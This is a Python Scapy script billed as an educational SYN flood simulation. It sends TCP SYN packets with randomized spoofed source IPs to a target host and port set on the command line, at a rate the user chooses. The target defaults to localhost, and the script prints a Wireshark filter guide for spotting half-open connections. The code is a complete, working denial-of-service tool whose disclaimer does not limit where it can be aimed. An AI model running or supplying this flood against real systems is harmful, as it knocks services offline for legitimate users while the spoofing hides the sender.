"""
SYN Flood Attack Simulation
============================
Educational purposes ONLY. Use only on your own lab/localhost.

A SYN Flood exploits the TCP 3-way handshake:
  1. Attacker sends many SYN packets with spoofed source IPs
  2. Server replies with SYN-ACK and waits for ACK (half-open connection)
  3. Server's connection table fills up → legitimate users can't connect

Wireshark filter to analyze: tcp.flags.syn == 1 && tcp.flags.ack == 0
"""

from scapy.all import IP, TCP, send, RandShort, RandIP
import time
import argparse

def syn_flood(target_ip: str, target_port: int, count: int, delay: float):
    """
    Send TCP SYN packets with randomized spoofed source IPs.

    Args:
        target_ip   : Victim IP (use 127.0.0.1 for localhost lab)
        target_port : Target port (e.g. 80, 443, 8080)
        count       : Number of packets to send
        delay       : Seconds between packets (0 = as fast as possible)
    """
    print(f"[*] Starting SYN Flood → {target_ip}:{target_port}")
    print(f"[*] Sending {count} packets | delay={delay}s")
    print("[*] Press Ctrl+C to stop early\n")

    sent = 0
    try:
        for i in range(count):
            # Craft packet: random src IP + random src port → SYN flag
            pkt = (
                IP(src=str(RandIP()), dst=target_ip) /
                TCP(sport=RandShort(), dport=target_port, flags="S", seq=RandShort())
            )
            send(pkt, verbose=False)
            sent += 1

            if sent % 100 == 0:
                print(f"  [+] Sent {sent}/{count} SYN packets...")

            if delay > 0:
                time.sleep(delay)

    except KeyboardInterrupt:
        pass

    print(f"\n[✓] SYN Flood complete. Total packets sent: {sent}")
    print("\n--- Wireshark Analysis Guide ---")
    print("Filter : tcp.flags.syn == 1 && tcp.flags.ack == 0")
    print("Look for: Many SYNs from different source IPs to the same dst port")
    print("          No corresponding ACKs (half-open connections)")
    print("          Server sending SYN-ACKs to spoofed/unreachable addresses")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SYN Flood Simulation (Educational)")
    parser.add_argument("--target",  default="127.0.0.1",  help="Target IP (default: 127.0.0.1)")
    parser.add_argument("--port",    type=int, default=80,  help="Target port (default: 80)")
    parser.add_argument("--count",   type=int, default=500, help="Number of packets (default: 500)")
    parser.add_argument("--delay",   type=float, default=0, help="Delay between packets in sec (default: 0)")
    args = parser.parse_args()

    syn_flood(args.target, args.port, args.count, args.delay)
